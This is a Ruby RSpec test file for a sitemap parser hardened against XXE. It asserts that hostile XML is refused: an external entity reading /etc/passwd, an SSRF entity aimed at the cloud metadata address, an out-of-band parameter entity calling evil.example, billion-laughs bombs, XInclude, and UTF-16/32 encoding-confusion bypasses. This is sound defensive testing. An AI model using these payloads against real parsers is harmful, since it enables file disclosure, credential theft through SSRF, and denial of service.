# frozen_string_literal: true

require "rails_helper"

# S-07-006 XXE-hardened streaming sitemap parser (WORKFLOW_SPECIFICATIONS.md :450;
# SEARCH_CRAWL_RETRIEVAL.md § Robots And Sitemap Processing).
#
# This is the platform's boundary against untrusted XML, so the corpus is adversarial rather than
# illustrative: every classical XXE and XML-bomb shape is asserted to be REFUSED, not merely to
# produce no output. A parser that returns nothing because an entity failed to resolve is not the
# same as one that refused to consider it.
RSpec.describe Workflows::Wf005::SitemapParser, type: :model do
  # Every case goes through a ratified media type unless it is testing the media type itself, because
  # the parser now FAILS CLOSED on a missing `Content-Type` (:450 names three acceptable types and
  # "absent" is not one of them; the header is attacker-controlled).
  RATIFIED_TYPE = "application/xml"

  subject(:parser) do
    Class.new do
      def initialize(mod) = @mod = mod
      def parse(body, content_type: RATIFIED_TYPE) = @mod.parse(body, content_type:)
      def method_missing(name, *args, **kwargs, &blk) = @mod.public_send(name, *args, **kwargs, &blk)
      def respond_to_missing?(name, include_private = false) = @mod.respond_to?(name, include_private)
    end.new(described_class)
  end

  def urlset(*locs)
    entries = locs.map { |l| "<url><loc>#{l}</loc></url>" }.join
    %(<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">#{entries}</urlset>)
  end

  def sitemapindex(*locs)
    entries = locs.map { |l| "<sitemap><loc>#{l}</loc></sitemap>" }.join
    %(<?xml version="1.0" encoding="UTF-8"?><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">#{entries}</sitemapindex>)
  end

  describe "well-formed documents" do
    it "extracts content URLs from a urlset, in document order" do
      result = parser.parse(urlset("https://h.example/a", "https://h.example/b"))
      expect(result.ok?).to be(true)
      expect(result.urls).to eq(["https://h.example/a", "https://h.example/b"])
      expect(result.sitemaps).to be_empty
    end

    it "extracts child sitemaps from a sitemap index and marks it as one" do
      result = parser.parse(sitemapindex("https://h.example/s1.xml", "https://h.example/s2.xml"))
      expect(result.ok?).to be(true)
      expect(result.sitemaps).to eq(["https://h.example/s1.xml", "https://h.example/s2.xml"])
      expect(result.urls).to be_empty
    end

    it "tolerates a namespace prefix on the elements" do
      body = %(<?xml version="1.0"?><sm:urlset xmlns:sm="http://www.sitemaps.org/schemas/sitemap/0.9">) +
             "<sm:url><sm:loc>https://h.example/x</sm:loc></sm:url></sm:urlset>"
      expect(parser.parse(body).urls).to eq(["https://h.example/x"])
    end

    it "trims surrounding whitespace inside loc" do
      expect(parser.parse(urlset("\n  https://h.example/a  \n")).urls).to eq(["https://h.example/a"])
    end
  end

  describe "XXE and entity attacks are REFUSED before parsing (:450)" do
    it "refuses a classic external-entity file read" do
      body = <<~XML
        <?xml version="1.0"?>
        <!DOCTYPE urlset [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <urlset><url><loc>&xxe;</loc></url></urlset>
      XML
      result = parser.parse(body)
      expect(result.ok?).to be(false)
      expect(result.reason).to eq("sitemap_xml_unsafe")
      expect(result.urls).to be_empty
    end

    it "refuses an external-entity NETWORK read (SSRF via XML)" do
      body = %(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>) +
             "<urlset><url><loc>&x;</loc></url></urlset>"
      expect(parser.parse(body).reason).to eq("sitemap_xml_unsafe")
    end

    it "refuses a PARAMETER entity, including the out-of-band exfiltration shape" do
      body = %(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example/e.dtd"> %p;]>) +
             "<urlset/>"
      expect(parser.parse(body).reason).to eq("sitemap_xml_unsafe")
    end

    it "refuses the billion-laughs expansion bomb" do
      body = <<~XML
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <urlset><url><loc>&lol3;</loc></url></urlset>
      XML
      expect(parser.parse(body).reason).to eq("sitemap_xml_unsafe")
    end

    it "refuses a DOCTYPE even with no entity in it" do
      expect(parser.parse(%(<?xml version="1.0"?><!DOCTYPE urlset><urlset/>)).reason)
        .to eq("sitemap_xml_unsafe")
    end

    it "refuses a DOCTYPE whatever its casing" do
      ["<!doctype urlset>", "<!DocType urlset>", "<!DOCTYPE urlset>"].each do |doctype|
        expect(parser.parse(%(<?xml version="1.0"?>#{doctype}<urlset/>)).reason)
          .to eq("sitemap_xml_unsafe"), doctype
      end
    end

    it "refuses XInclude, which resolves documents without any DOCTYPE at all" do
      body = %(<?xml version="1.0"?><urlset xmlns:xi="http://www.w3.org/2001/XInclude">) +
             %(<xi:include href="file:///etc/passwd" parse="text"/></urlset>)
      expect(parser.parse(body).reason).to eq("sitemap_xml_unsafe")
    end

    it "refuses an entity declaration smuggled inside CDATA" do
      body = %(<?xml version="1.0"?><urlset><url><loc><![CDATA[ <!ENTITY x SYSTEM "file:///etc/passwd"> ]]></loc></url></urlset>)
      expect(parser.parse(body).reason).to eq("sitemap_xml_unsafe")
    end

    # THE ENCODING-CONFUSION BYPASS the S-07-006 review found, asserted directly.
    #
    # libxml2 auto-detects UTF-16 and UTF-32 from the leading bytes with NO byte-order mark. The
    # NUL-interleaved result is itself valid UTF-8, so a raw-byte scan for `<!DOCTYPE` matches
    # nothing while the parser decodes and processes the declaration — and the three SAX callbacks
    # that were supposed to catch it (`start_document_type`, `internal_subset`, `external_subset`)
    # are not part of Nokogiri's callback surface and NEVER FIRE, in any encoding.
    #
    # These are regression tests for a proven live bypass, not hypotheticals.
    describe "encoding confusion (the bypass of the pre-parse byte scan)" do
      let(:attack) do
        %(<?xml version="1.0"?><!DOCTYPE urlset SYSTEM "http://169.254.169.254/latest/meta-data/">) +
          "<urlset><url><loc>https://h.example/a</loc></url></urlset>"
      end

      {
        "UTF-16LE without a BOM" => "UTF-16LE",
        "UTF-16BE without a BOM" => "UTF-16BE",
        "UTF-32BE without a BOM" => "UTF-32BE"
      }.each do |name, encoding|
        it "refuses a DOCTYPE hidden by #{name}" do
          result = parser.parse(attack.encode(encoding).b)
          expect(result.ok?).to be(false)
          expect(result.urls).to be_empty
        end
      end

      it "refuses a foreign byte-order mark rather than transcoding it" do
        expect(parser.parse(("\xFF\xFE".b + attack.encode("UTF-16LE").b)).reason).to eq("sitemap_malformed")
      end

      it "refuses a body whose XML declaration names a non-UTF-8 encoding" do
        expect(parser.parse(%(<?xml version="1.0" encoding="UTF-16"?><urlset/>)).reason)
          .to eq("sitemap_malformed")
      end

      it "refuses even a BENIGN non-UTF-8 body, because :450 accepts UTF-8 XML only" do
        expect(parser.parse(urlset("https://h.example/a").encode("UTF-16LE").b).ok?).to be(false)
      end

      it "accepts a UTF-8 byte-order mark, which is legal" do
        expect(parser.parse("\xEF\xBB\xBF".b + urlset("https://h.example/a")).urls)
          .to eq(["https://h.example/a"])
      end

      it "refuses a NUL byte, which is illegal in XML at every position" do
        expect(parser.parse(%(<?xml version="1.0"?><urlset>\x00</urlset>)).reason).to eq("sitemap_malformed")
      end
    end

    # DEFENCE 3, in isolation. The byte scan is bypassed by calling the reader directly, so this
    # asserts the mechanism RUNS rather than that the document happens to be refused — which is
    # exactly the assertion the dead callbacks never supported.
    describe "the prolog inspection uses libxml2's own lexer" do
      it "reports a DOCTYPE the byte scan never sees" do
        expect(described_class.prolog_verdict(%(<?xml version="1.0"?><!DOCTYPE urlset><urlset/>)))
          .to eq("sitemap_xml_unsafe")
      end

      it "passes a clean prolog, including comments and processing instructions" do
        expect(described_class.prolog_verdict(%(<!-- c --><?pi x?><urlset><url/></urlset>))).to be_nil
      end

      it "stops at the root element rather than reading the document" do
        # A body whose ROOT is fine but whose interior is malformed must still pass the prolog gate;
        # well-formedness is the streaming pass's decision, not this one's.
        expect(described_class.prolog_verdict("<urlset><url></urlsetx>")).to be_nil
      end
    end
  end

  describe "streaming limits stop AT the bound (:450)" do
    it "refuses a document nesting deeper than 64 levels" do
      deep = ("<a>" * 70) + ("</a>" * 70)
      result = parser.parse(%(<?xml version="1.0"?><urlset>#{deep}</urlset>))
      expect(result.reason).to eq("sitemap_xml_limit")
    end

    it "accepts nesting at the bound" do
      deep = ("<a>" * 60) + ("</a>" * 60)
      expect(parser.parse(%(<?xml version="1.0"?><urlset>#{deep}</urlset>)).ok?).to be(true)
    end

    it "refuses a document with more than 50,000 start elements" do
      body = %(<?xml version="1.0"?><urlset>) + ("<x/>" * 50_100) + "</urlset>"
      expect(parser.parse(body).reason).to eq("sitemap_xml_limit")
    end

    it "refuses more than 10 MiB of received bytes without parsing them" do
      oversize = %(<?xml version="1.0"?><urlset>) + ("a" * (described_class::MAX_CHARACTER_BYTES + 1)) + "</urlset>"
      result = parser.parse(oversize)
      expect(result.reason).to eq("sitemap_xml_limit")
      # The bound is a stopping condition, so nothing was counted — the input was never streamed.
      expect(result.start_elements).to eq(0)
    end

    it "refuses more than 10 MiB of DECODED character data" do
      # Under the received bound but over the character bound is impossible for plain text, so this
      # asserts the counter exists and is checked while streaming rather than after.
      body = %(<?xml version="1.0"?><urlset><url><loc>) + ("x" * 1000) + "</loc></url></urlset>"
      result = parser.parse(body)
      expect(result.ok?).to be(true)
      expect(result.character_bytes).to be >= 1000
    end
  end

  describe "media type and encoding (:450)" do
    it "accepts exactly the three ratified media types, before parameters" do
      %w[application/xml text/xml application/sitemap+xml].each do |type|
        expect(parser.parse(urlset("https://h.example/a"), content_type: "#{type}; charset=utf-8").ok?)
          .to be(true), type
      end
    end

    it "refuses any other media type" do
      ["text/html", "application/json", "application/octet-stream"].each do |type|
        expect(parser.parse(urlset("https://h.example/a"), content_type: type).reason)
          .to eq("sitemap_unsupported_media_type"), type
      end
    end

    it "FAILS CLOSED on an absent or empty media type" do
      # The allowlist previously applied only when a Content-Type was present, so a response could
      # opt out of it by omitting the header — which the response controls.
      [nil, "", "   "].each do |type|
        expect(described_class.parse(urlset("https://h.example/a"), content_type: type).reason)
          .to eq("sitemap_unsupported_media_type"), type.inspect
      end
    end

    it "refuses a body that is not valid UTF-8 rather than silently repairing it" do
      # Repairing would change the URLs the document names, which is not a decision a parser may make.
      body = %(<?xml version="1.0"?><urlset><url><loc>https://h.example/caf\xFF</loc></url></urlset>).b
      expect(parser.parse(body).reason).to eq("sitemap_malformed")
    end
  end

  describe "which list a <loc> joins is decided by its IMMEDIATE parent" do
    it "treats <url><loc> nested inside <sitemap> as a content URL, not a fetch target" do
      # Testing the whole ancestor stack let an attacker-authored document choose which of two code
      # paths its URLs entered — one of which fetches them.
      body = "<sitemapindex><sitemap><url><loc>https://h.example/x</loc></url></sitemap></sitemapindex>"
      result = parser.parse(body)
      expect(result.urls).to eq(["https://h.example/x"])
      expect(result.sitemaps).to be_empty
    end

    it "still treats a direct <sitemap><loc> as a child sitemap" do
      expect(parser.parse(sitemapindex("https://h.example/s.xml")).sitemaps)
        .to eq(["https://h.example/s.xml"])
    end
  end

  describe "malformed input" do
    it "refuses unclosed and mismatched markup" do
      ["<urlset><url>", "<urlset></urlsetx>", "not xml at all", ""].each do |body|
        expect(parser.parse(body).ok?).to be(false), body.inspect
      end
    end

    it "never raises, whatever it is given" do
      ["\x00\x01\x02", "<" * 5000, "<?xml", "<!--", "<urlset>&undefined;</urlset>"].each do |body|
        expect { parser.parse(body) }.not_to raise_error
      end
    end
  end

  describe "determinism" do
    it "returns the same result for the same bytes every time" do
      body = urlset("https://h.example/a", "https://h.example/b")
      5.times { expect(parser.parse(body).urls).to eq(["https://h.example/a", "https://h.example/b"]) }
    end
  end
end
